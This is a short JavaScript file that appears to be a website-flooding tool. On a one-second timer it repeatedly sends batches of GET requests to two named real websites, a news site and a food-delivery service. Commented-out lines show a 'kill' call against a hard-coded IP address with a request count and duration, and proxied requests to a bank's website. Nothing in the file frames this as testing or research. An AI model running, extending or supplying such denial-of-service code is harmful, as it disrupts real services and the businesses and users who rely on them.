const GRequest = require('./lib/g-request');

const Urls = [
  'https://nsn.fm/',
  'https://www.delivery-club.ru/'
];




function Interact(url){
  const gateway_request = new GRequest();

  for(var i=0; i<3; i++){
    gateway_request.get(url)
  }
}



Urls.forEach(el => {
  setInterval(() => Interact(el), 1000)
})




//
// var api = new Kira();
//
// api.kill('https://67.227.226.240 ', 200, 10000, "http://" + host + ":" + port);

// var proxyUrl = "http://" + user + ":" + password + "@" + host + ":" + port;
//
// var proxiedRequest = request.defaults({'proxy': proxyUrl});
//
// proxiedRequest.get("https://fransabank.by/", function (e, r) {
//   if(e){
//     console.log('error')
//   } else {
//     console.log(resp?.statusCode)
//   }
//
//
//
// })